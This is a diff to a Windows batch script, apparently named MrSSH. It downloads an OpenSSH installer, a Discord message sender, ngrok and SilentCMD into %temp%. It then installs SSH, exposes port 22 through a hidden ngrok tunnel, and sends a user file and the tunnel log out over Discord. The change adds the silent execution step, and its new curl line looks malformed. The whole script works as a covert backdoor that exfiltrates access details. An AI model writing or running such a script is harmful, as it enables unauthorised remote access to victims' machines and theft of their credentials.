@@ -4,6 +4,7 @@ cd %temp%
 curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o OpenSSH.ps1
 curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
+curl https://github.com/dh3b/MrSSH/raw/main/Files/SilentCMD.exe - SilentCMD.exe
 
 set ""
 
@@ -20,6 +21,6 @@ Source.bat +silent --file %temp%/user.txt
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
-start timeout 5 & Source.bat +silent --file %temp%/ngrok.log
-ngrok.exe tcp 22 -log=stdout > ngrok.log
+silentcmd %temp%\ngrok.cmd
+Source.bat +silent --file %temp%/ngrok.log
 
